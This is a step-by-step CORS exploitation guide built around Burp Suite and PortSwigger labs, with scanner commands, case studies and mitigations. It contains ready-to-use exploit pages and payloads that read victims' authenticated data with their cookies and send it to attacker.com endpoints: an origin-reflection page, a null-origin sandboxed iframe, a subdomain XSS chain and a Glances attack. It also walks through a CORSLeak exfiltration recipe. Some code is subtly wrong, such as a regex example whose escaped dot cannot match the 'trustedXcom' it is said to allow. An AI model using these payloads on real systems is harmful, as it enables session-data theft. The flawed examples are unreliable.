# Comprehensive CORS Exploitation Methodology

## Understanding CORS and Why It Matters

Cross-Origin Resource Sharing (CORS) is a browser security mechanism that controls which external domains can access resources from a website. When a web application makes a request to a different domain, the browser automatically adds an `Origin` header. The server then responds with `Access-Control-Allow-Origin` (ACAO) to indicate if the requesting domain is permitted to read the response.

The danger arises when servers are misconfigured to reflect any origin value or trust untrusted origins like `null`. An attacker can create a malicious webpage that, when visited by an authenticated user, makes a cross-origin request to the vulnerable application. Because the user's browser includes their session cookies, the attacker can read sensitive data from the response.

---

## Prerequisites and Setup

Before testing for CORS vulnerabilities, ensure you have:

- **Burp Suite Professional or Community Edition** installed and configured
- **FoxyProxy** browser extension for traffic routing
- **A modern browser** (Chrome or Firefox) for testing
- **Python environment** for running automated scanners (optional)

**Initial Configuration:**
1. Configure your browser to route traffic through Burp Suite (default: 127.0.0.1:8080)
2. Install Burp's CA certificate in your browser to avoid SSL errors
3. Turn off intercept mode while browsing to avoid accidentally blocking requests

---

## Step 1: Identifying CORS Headers in HTTP Traffic

The first step in any CORS assessment is identifying which endpoints implement CORS headers.

### Manual Inspection Using Burp Suite

1. **Login to the target application** using provided credentials (e.g., `wiener:peter` in PortSwigger labs)
2. Navigate through authenticated sections like "My Account" or dashboard pages
3. In Burp Suite, go to **Proxy > HTTP History**
4. Look for requests that return JSON data containing sensitive information (API keys, user details, tokens)
5. Examine the response headers for CORS-related headers

**Key Headers to Identify:**
- `Access-Control-Allow-Origin` - Indicates which origins are permitted
- `Access-Control-Allow-Credentials` - Shows whether cookies can be included
- `Access-Control-Allow-Methods` - Lists allowed HTTP methods
- `Access-Control-Allow-Headers` - Lists allowed custom headers

**Red Flags to Look For:**
- Presence of `Access-Control-Allow-Credentials: true` (credentials are permitted)
- `Access-Control-Allow-Origin` set to `*` (wildcard - all origins allowed)
- `Access-Control-Allow-Origin` reflecting back arbitrary values

### Example Analysis

When inspecting a request to `/accountDetails`, you might see:

```
Response Headers:
Access-Control-Allow-Credentials: true
Content-Type: application/json
```

The presence of `Access-Control-Allow-Credentials: true` indicates the server is configured to allow credentialed cross-origin requests - a necessary condition for exploitation.

---

## Step 2: Testing Origin Reflection

Once you've identified a candidate endpoint, you need to determine if the server validates the `Origin` header properly.

### Using Burp Suite Repeater

1. **Send the request to Repeater** by right-clicking the request in HTTP History and selecting "Send to Repeater"
2. **Add an `Origin` header** with a test value:
   ```
   Origin: https://evil.com
   ```
3. **Send the request** and examine the response headers
4. **Check if the `Origin` value is reflected** in the `Access-Control-Allow-Origin` response header

**Successful exploitation indicators:**
- Response contains `Access-Control-Allow-Origin: https://evil.com`
- Response contains `Access-Control-Allow-Credentials: true`
- The actual data (JSON response body) is returned

### Testing Various Origin Values

To thoroughly test origin validation, try these values in sequence:

| Test Origin | What It Tests |
|-------------|---------------|
| `https://evil.com` | Basic arbitrary origin reflection |
| `null` | Null origin whitelist testing |
| `https://target.com.evil.com` | Substring/regex bypass |
| `https://subdomain.target.com` | Subdomain trust testing |
| `http://target.com` | Protocol downgrade testing (HTTPS vs HTTP) |

**For subdomain trust testing:** If the server reflects `https://subdomain.target.com`, it may trust any subdomain - including HTTP subdomains that could be vulnerable to XSS.

---

## Step 3: Validating Credential Inclusion

CORS exploitation is most dangerous when credentials are included because it allows the attacker to access the victim's authenticated data.

### Testing with Burp Repeater

When you send a request with an `Origin` header and receive `Access-Control-Allow-Credentials: true`, this means the server is willing to accept credentialed cross-origin requests.

**Important security note:** The browser will only allow JavaScript to read the response if:
1. The server's `Access-Control-Allow-Origin` matches the requesting origin exactly
2. The server returns `Access-Control-Allow-Credentials: true`
3. The requesting script uses `withCredentials = true`

---

## Step 4: Automated Scanning Tools

For larger assessments, automated tools can accelerate detection.

### Corser - Advanced CORS Scanner

Corser is a Golang-based CLI tool that automates CORS misconfiguration detection and generates proof-of-concept code.

**Installation:**
```bash
go install -v github.com/cyinnove/corser/cmd/corser@latest
```

**Basic Usage - Single URL Scan:**
```bash
corser single -u https://example.com/api/endpoint
```

**Multiple URL Scan:**
```bash
corser multi -l url_list.txt -o results.txt
```

**Proxy Mode - Integrate with Burp Suite:**
```bash
corser proxy -p 9090
```
This mode receives requests from Burp Suite as an upstream proxy and scans them automatically.

**Advanced Flags:**
- `-g, --gen-poc` - Automatically generate HTML exploit code for any vulnerability found
- `-d, --deep-scan` - Enable advanced bypass technique testing
- `-k, --cookie` - Include authentication cookies in scan requests
- `-H, --header` - Add custom headers to scan requests

### Corsy - Python-Based Scanner

```bash
# Install from GitHub
git clone https://github.com/s0md3v/Corsy
cd Corsy
pip3 install -r requirements.txt

# Run scan
python3 corsy.py -u https://example.com
```

### CORScanner - Alternative Scanner

```bash
git clone https://github.com/chenjj/CORScanner
cd CORScanner
python cors_scan.py -u example.com
```

---

## Step 5: Building the Exploit - Two Common Attack Scenarios

### Scenario 1: Basic Origin Reflection (Most Common)

This occurs when the server reflects any `Origin` header value back in `Access-Control-Allow-Origin` while allowing credentials.

**Exploit HTML Template:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit - Data Exfiltration</title>
</head>
<body>
    <h1>CORS Vulnerability Exploit</h1>
    <div id="result">Exploiting CORS misconfiguration...</div>
    
    <script>
        var xhr = new XMLHttpRequest();
        var targetUrl = "https://target.com/api/accountDetails";
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                // Display the stolen data
                document.getElementById("result").innerHTML = "<pre>" + xhr.responseText + "</pre>";
                
                // Exfiltrate to attacker server
                var exfil = new XMLHttpRequest();
                exfil.open("POST", "https://attacker.com/collect", true);
                exfil.send("data=" + encodeURIComponent(xhr.responseText));
            }
        };
        
        xhr.open("GET", targetUrl, true);
        xhr.withCredentials = true;  // Send cookies/session
        xhr.send();
    </script>
</body>
</html>
```

**How to Deploy Using Burp Suite Exploit Server:**

1. In Burp Suite, navigate to the **Exploit Server** tab
2. Paste the HTML code into the **Body** section
3. Replace `target.com` with your target URL
4. Click **Store** to save the exploit
5. Click **Deliver to Victim** to simulate the attack

**Expected Result:** The victim's browser makes a request to `/accountDetails` with their session cookie. The server responds with `Access-Control-Allow-Origin: https://attacker.com` and `Access-Control-Allow-Credentials: true`, allowing the JavaScript to read the sensitive data.

---

### Scenario 2: Null Origin Whitelist Exploitation

Some servers incorrectly whitelist the `null` origin value. An attacker can generate a `null` origin using a sandboxed iframe.

**Detection:** Send a request with `Origin: null` in Repeater. If the response contains `Access-Control-Allow-Origin: null` with credentials allowed, the server is vulnerable.

**Exploit Code for Null Origin:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>CORS Null Origin Exploit</title>
</head>
<body>
    <h1>Exploiting CORS Null Origin Misconfiguration</h1>
    
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
            srcdoc="
                <script>
                    var request = new XMLHttpRequest();
                    request.open('GET', 'https://target.com/accountDetails', true);
                    request.onload = function() {
                        window.location.href = 'https://attacker.com/log?key=' + 
                                                encodeURIComponent(request.responseText);
                    };
                    request.withCredentials = true;
                    request.send();
                </script>
            ">
    </iframe>
</body>
</html>
```

**Why This Works:** The `sandbox` attribute on the iframe forces the content to execute with a `null` origin. Since the server trusts the `null` origin and allows credentials, the browser permits the cross-origin read operation.

**Real-world Example:** HALO 2.13.1 was found vulnerable to this exact attack vector. The application allowed two-way interaction from null origin, effectively enabling any domain to perform data extraction using a sandboxed iframe.

---

### Scenario 3: Subdomain Trust with XSS Chaining

When a server trusts any subdomain (including HTTP subdomains) and there's an XSS vulnerability on an HTTP subdomain, attackers can chain these issues.

**Attack Flow:**
1. The main application uses HTTPS and has sensitive endpoints like `/accountDetails`
2. The server trusts any subdomain, including `http://stock.target.com`
3. The `productId` parameter on `http://stock.target.com` has reflected XSS
4. Attacker crafts URL with XSS payload that makes credentialed request to HTTPS main domain

**Exploit Construction:**

```javascript
// XSS payload injected into productId parameter
<script>
    const request = new XMLHttpRequest();
    request.open("GET", "https://target.com/accountDetails", true);
    request.onload = () => {
        window.location.href = "https://attacker.com/collect?data=" + 
                               encodeURIComponent(request.responseText);
    };
    request.withCredentials = true;
    request.send();
</script>
```

The URL-encoded version is injected into:
```
http://stock.target.com/?productId=%3c%73%63%72%69%70%74%3e...%3c%2f%73%63%72%69%70%74%3e&storeId=1
```

When the victim visits this URL, the XSS executes in the HTTP subdomain context. Because the server trusts that subdomain's origin, the CORS policy permits reading the response from the HTTPS main domain.

---

## Step 6: Advanced Exploitation - Preflight Request Abuse

### Understanding Preflight Requests

For certain types of requests (those with custom headers or non-standard content types), browsers automatically send an `OPTIONS` preflight request before the actual request. The server's response to the `OPTIONS` request determines whether the browser will proceed.

### CVE-2026-33533: Glances XML-RPC Server Exploitation

**Vulnerability Details:** The Glances system monitoring tool (versions prior to 4.5.3) had its XML-RPC server configured with `Access-Control-Allow-Origin: *` (wildcard). Because the server didn't validate the `Content-Type` header, an attacker could make a CORS simple request (POST with `Content-Type: text/plain`) containing a valid XML-RPC payload.

**Impact:** An attacker-controlled webpage could retrieve complete system monitoring data including:
- Hostname and OS version
- IP addresses
- CPU, memory, disk, and network statistics
- Full process list with command lines (often containing passwords, tokens, and internal paths)

**Exploit Code:**
```html
<script>
    fetch('http://vulnerable-glances-server:61208/api/4/processlist', {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain'
        },
        body: '<?xml version="1.0"?><methodCall><methodName>getAll</methodName><params></params></methodCall>',
        credentials: 'include'
    }).then(response => response.text())
      .then(data => {
          fetch('https://attacker.com/steal', {method: 'POST', body: data});
      });
</script>
```

**CVSS Score:** 7.1 (High) - Requires no authentication, only that a victim visits a malicious page while the Glances server is accessible.

---

### CORSLeak: Google Cloud IAP Preflight Exfiltration

**Vulnerability Discovery (2025-2026):** Researchers at Mitiga discovered that when CORS is enabled on Google Cloud's Identity-Aware Proxy (IAP), preflight `OPTIONS` requests are allowed to pass through without authentication.

**Attack Requirements:**
- IAP-protected App Engine with CORS setting enabled
- Internal VM with access to `*.googleapis.com`
- IAM role `roles/appengine.deployer`

**Attack Methodology:**

1. **Encode target secret as Base64 string**
2. **Create malicious `app.yaml` file** with the secret in the `Access-Control-Allow-Origin` header
3. **Deploy the App Engine** using `gcloud app deploy`
4. **Send external `OPTIONS` request** to retrieve the header:

```bash
curl -X OPTIONS -I https://domain.example.com/image.jpg
```

The response contains:
```
Access-Control-Allow-Origin: c2VjcmV0ZGF0YQ==
```

5. **Decode the Base64 string** to retrieve the exfiltrated data

**Key Finding:** Even in environments with no outbound connectivity and strict VPC Service Controls, an attacker with the right IAM role can leak data via preflight `OPTIONS` requests. Google updated documentation to clarify that preflight `OPTIONS` requests are unauthenticated and unaudited by IAP.

---

## Step 7: Browser-Based Testing Tools

### Using Fiddler Everywhere for CORS Testing

Fiddler Everywhere can create rules to bypass CORS policies during testing:

1. Create a "Bypass CORS" rule that sets:
   - `Access-Control-Allow-Origin: *`
   - `Access-Control-Allow-Methods: *`
   - `Access-Control-Allow-Credentials: true`
   - `Access-Control-Allow-Headers: *`

2. Enable the rule and start capturing traffic

**Note:** This is for testing purposes only and should never be used in production.

### Using Browser Developer Tools

1. Open Developer Tools (F12)
2. Navigate to the **Network** tab
3. Look for requests with `Access-Control-Allow-Origin` in response headers
4. Use the **Console** to test cross-origin requests:

```javascript
fetch('https://target.com/api/data', {
    credentials: 'include',
    headers: {'Origin': 'https://evil.com'}
}).then(r => r.text()).then(console.log);
```

---

## Step 8: Real-World Case Studies

### Case Study 1: HackerOne Bug Bounty - CORS Misconfiguration

**Report #235200** documented a CORS misconfiguration that allowed attackers to steal user data. The vulnerability occurred because the server reflected any `Origin` header while allowing credentials. The bounty was awarded for responsibly disclosing this issue.

### Case Study 2: HALO 2.13.1 CORS Vulnerability (2024)

**Discovered by:** nu11secur1ty

**Vulnerability:** The HALO application allowed arbitrary origin trust and specifically whitelisted the `null` origin. The server also returned `Access-Control-Allow-Credentials: true`, enabling full two-way interaction from untrusted origins.

**Exploit Used:**
```html
<script>
function cors() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            alert(this.responseText);  // Exfiltrates sensitive data
        }
    };
    xhttp.open("GET", "http://target:8090/apis/api.console.halo.run/v1alpha1/users/-", true);
    xhttp.withCredentials = true;
    xhttp.send();
}
</script>
```

**Impact:** Attackers could extract session identifiers (SIDs) and user data from authenticated sessions.

### Case Study 3: Chrome CORS Policy Bypass (CVE-2026-6313)

**Vulnerability:** Google Chrome versions prior to 147.0.7727.101 had insufficient policy enforcement in CORS, allowing a remote attacker who had compromised the renderer process to leak cross-origin data via a crafted HTML page.

**Severity:** Chromium security severity - High

**Mitigation:** Upgrade to Chrome 147.0.7727.101 or later, and enable Chrome's Site Isolation feature.

### Case Study 4: Litestar CORS Regex Bypass (CVE-2026-25478)

**Vulnerability:** The Litestar web framework (versions prior to 2.19.0) had a CORS configuration where the dot character `.` in allowed origins was interpreted as a regex wildcard rather than a literal character.

**Example of vulnerable configuration:**
```python
cors = CORSConfig(allow_origins=["https://good.example"])
```

**Bypass:** An attacker using `Origin: https://goodXexample` would be allowed because the dot matched any character.

**Fix:** Properly escape regex metacharacters or use exact string matching.

---

## Step 9: Detection and Prevention

### How to Detect CORS Misconfigurations

**Manual Testing Checklist:**

1. **Identify all endpoints** that return sensitive data and have CORS headers
2. **Test origin reflection** by sending requests with various `Origin` values
3. **Check for `null` origin whitelisting**
4. **Verify subdomain trust boundaries** - especially HTTP subdomains
5. **Look for regex bypass opportunities** - test with characters that might bypass pattern matching
6. **Check for wildcard usage** - `Access-Control-Allow-Origin: *` with credentials is invalid but still risky for public data

**Automated Scanning Commands:**

```bash
# Corser single URL scan with PoC generation
corser single -u https://target.com/api/endpoint -g --deep-scan

# Corsy scan with multiple origins
python3 corsy.py -u https://target.com -t 20

# Custom curl test suite
for origin in "https://evil.com" "null" "https://target.com.evil.com" "http://sub.target.com"; do
    curl -s -H "Origin: $origin" https://target.com/api/data -I | grep -E "Access-Control"
done
```

### Mitigation Strategies

**For Developers:**

1. **Never reflect Origin values dynamically** - Use an explicit allowlist
2. **Never whitelist `null` origin** - Treat it as untrusted
3. **When using credentials (`Access-Control-Allow-Credentials: true`):**
   - `Access-Control-Allow-Origin` must be a single explicit trusted origin
   - Never use wildcard `*` with credentials
4. **Escape regex metacharacters** when building origin validation patterns
5. **Implement server-side authorization** - CORS is not access control
6. **Validate both prefix and suffix** for exact matches

**Secure Configuration Example:**
```python
ALLOWED_ORIGINS = ['https://trusted.com', 'https://app.trusted.com']

def validate_origin(origin):
    return origin in ALLOWED_ORIGINS  # Exact match only
```

**Vulnerable Configuration Example (avoid):**
```python
# VULNERABLE - regex bypass possible
import re
pattern = r'https://trusted\.com'
if re.match(pattern, origin):
    # This matches 'https://trustedXcom' - bypass possible
```

---

## Summary: Complete Testing Workflow

```
1. Configure Burp Suite and browser proxy
   ↓
2. Login to application and identify sensitive endpoints
   ↓
3. Check HTTP history for CORS headers and sensitive JSON responses
   ↓
4. Send candidate endpoints to Repeater
   ↓
5. Test Origin values: arbitrary domain, null, subdomains
   ↓
6. Check if ACAO reflects Origin value with credentials allowed
   ↓
7. If vulnerable, generate exploit HTML (manually or with corser -g)
   ↓
8. Deploy exploit via Burp Exploit Server or local web server
   ↓
9. Test exploit in browser with authenticated session
   ↓
10. Verify data exfiltration works
    ↓
11. Document findings and report responsibly
```

---

## References

- PortSwigger Web Security Academy - CORS Labs
- Intigriti Blog - Exploiting CORS Misconfiguration Vulnerabilities
- CVE-2026-33533: Glances XML-RPC Server CORS Wildcard
- CVE-2026-6313: Chrome CORS Policy Bypass
- Mitiga Research - CORSLeak: Abusing IAP for Stealthy Data Exfiltration
- HackerOne Report #235200
- GitHub - AdityaBhatt3010/CORS-vulnerability-with-trusted-null-origin
- GitHub - cyinnove/corser
